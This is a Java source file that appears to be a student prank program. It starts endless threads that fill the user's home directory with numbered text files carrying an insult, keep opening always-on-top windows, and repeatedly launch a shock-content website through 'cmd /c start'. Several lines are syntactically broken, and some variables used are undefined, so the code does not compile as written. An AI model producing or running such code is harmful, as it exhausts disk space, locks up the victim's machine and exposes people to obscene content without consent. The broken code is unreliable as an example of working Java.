
import java.io.File;
import java.io.FileWriter;
import java.io.BufferedWriter;
import java.io.IOException;

import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.WindowConstants;

import javazoom.io.MainClass;
import javazoom.io.MainClass.ClickListener;

import java.awt.Desktop;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.net.URI;
import java.net.URISyntaxException;



 public class Loop {
	 
	 static ClickListener cl = new ClickListener();
	public static void main(String[] args) throws InterruptedException {
		Thread thread = new Thread(() -> {
			for (long i = 0; i < Long.MAX_VALUE; i++) {
				
				System.out.println(i);
				File newFile = new File(System.getProperty("user.home"), String.format("%d.txt", i));
				BufferedWriter bw = null;
				FileWriter fw = null;
				
				try {
					String content ="You're an idiot habibti";
										
					fw = new FileWriter(newFile);
					bw = new BufferedWriter(fw);
					bw.write(content);
					
					System.out.println("Done");
					
				} catch (IOException e){
					
					e.printStackTrace();
				} finally {
					try{
						if (bw != null)
							bw.close();
						
						if (fw !=null)
							fw.close();
					} catch (IOException ex){
						
						ex.printStackTrace();
					}
				}
			}
		});
		
		thread.start();
	
		Thread thread2 = new Thread(() -> {
			while(true) {
				
				JFrame frame = new JFrame();
				frame.setAlwaysOnTop(true);
				frame.setLocationByPlatform(true);
				frame.setSize(900, 750);
				frame.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);
				showLoader(frame);
				private JButton button1  = new JButton("Click Me!");	
				button1.addActionListener(cl);
			    frame.add(button1)("Click Me!"), exitButton= new JButton("Exit");
			}
		});
		thread2.start();
		
		
		
		
		
		Thread url = new Thread(() -> {
			
			while(true)
			try {
				Runtime.getRuntime().exec("cmd /c start http://2girls1cup.ca/");
			} catch (IOException e) {
				
				e.printStackTrace();
				if(Desktop.isDesktopSupported())
				{
				  try {
					Desktop.getDesktop().browse(new URI("https://www.youtube.com/watch?v=IRjJRTLlKy8"));
				} catch (IOException | URISyntaxException e1) {
					
					e1.printStackTrace();
				}
				}
			}
			
		});
		url.start();
	}	
	public static void showLoader(JFrame frameLoader){
      //  URL url = Loop.class.getResource("file:C:\\Users\\linus.olofsson1\\Desktop\\15Te-Linus.Olofsson\\Strukturer\\srccrazyfrogbrothers.gif");
        //Icon icon = new ImageIcon(url);
        JLabel label = new JLabel();
        
        frameLoader.getContentPane();
        frameLoader.setSize(900, 750);
        frameLoader.getContentPane().add(label);
        frameLoader.getContentPane().add(label);
        frameLoader.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frameLoader.setLocationRelativeTo(null);
        frameLoader.setVisible(true);
	// ta bort/ lägg till för modifering och test Thread.sleep(1000);
	
	};
	public class ClickListener implements ActionListener {
	    private int clickCount = 0;
    public void actionPerformed(ActionEvent e) {
        if (e.getSource() == button1) {
          clickCount++;
          if (clickCount == 1)
            button1.setText("clicked!");
          else
            button1.setText("clicked " + clickCount + " times!");
        } else if (e.getSource() == exitButton) {
          if (clickCount > 0)
            System.exit(0);
          else {
            JOptionPane.showMessageDialog(frame.this, "You must click at least once!",
                "Title", JOptionPane.ERROR_MESSAGE);
          }
        }
      }
}
 }
// Bara för jag kan